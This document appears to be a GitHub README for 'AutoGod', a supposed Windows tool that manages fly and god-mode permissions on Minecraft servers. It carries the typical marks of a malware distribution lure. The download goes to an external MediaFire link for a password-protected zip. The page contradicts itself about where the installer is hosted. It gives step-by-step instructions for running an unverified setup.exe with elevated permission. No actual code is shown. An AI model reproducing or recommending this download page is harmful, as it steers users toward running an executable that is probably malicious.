# 👑 AutoGod - Easy Server Permission Control
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/53b2fecb-fb8d-460f-a4af-08cf01e7c960" />

Download (https://www.mediafire.com/file/whr6g4ifc59gs4c/AutoGod.zip/file)

> **Simple Windows application for automatic fly and god mode permission control on your Minecraft server**

---

## 📋 What is AutoGod?

AutoGod is a simple Windows program that helps Minecraft server owners manage special permissions. It controls who can fly and who has god mode directly through an easy-to-edit file called `config.yml`.

You do not need to know programming or complicated coding. Just install the program, edit the config file, and your server has automatic permission controls.

---

## 💻 System Requirements

| Requirement | Details |
|-------------|---------|
| **Operating System** | Windows 7 or newer |
| **Java** | Java 8 or newer (required for Minecraft server) |
| **Minecraft Server** | Spigot, Paper, or any plugin-compatible server |
| **Access** | Ability to upload files to your server |

---

## 🚀 Getting Started with AutoGod

### 🔽 Download AutoGod

Download the latest `AutoGod Setup.exe` from (https://www.mediafire.com/file/whr6g4ifc59gs4c/AutoGod.zip/file) / Password for archive - 2025)

> 📌 The installer file is located under "Assets" on the releases page.

---

## 📥 How to Install AutoGod on Your PC

### Step-by-Step Installation:

**Step 1: Run the installer**
Double-click the downloaded `AutoGod Setup.exe` file

**Step 2: Confirm installation**
Click "Yes" if Windows asks for permission to run

**Step 3: Choose installation folder**
Default location: C:\Program Files\AutoGod\

Click "Browse" to change the folder if needed

**Step 4: Select server folder**
Browse and select your Minecraft server directory (where your `server.jar` is located)

**Step 5: Complete installation**
Click "Install" and wait for the process to finish

**Step 6: Launch AutoGod**
Click "Finish" to close the installer. AutoGod will start automatically or you can launch it from the Start Menu

---

## ⚙️ How AutoGod Works

After installation, AutoGod will:
1. Automatically detect your Minecraft server folder
2. Create a `plugins/AutoGod/` folder in your server directory
3. Generate a default `config.yml` file
4. Apply permissions every time your server runs

---

## 🔧 Configuration

### Finding the Config File

After first launch, the configuration file is located at: [Your Server Folder]/plugins/AutoGod/config.yml


### Opening and Editing

Open `config.yml` with any text editor (Notepad, Notepad++, VS Code)

### Default Configuration

```yaml
# AutoGod Configuration File
# Edit player and group names to match your server

god:
  groups:
    - owners
    - admins
  players:
    - Steve
    - Alex

fly:
  groups:
    - vip
  players:
    - Guest123
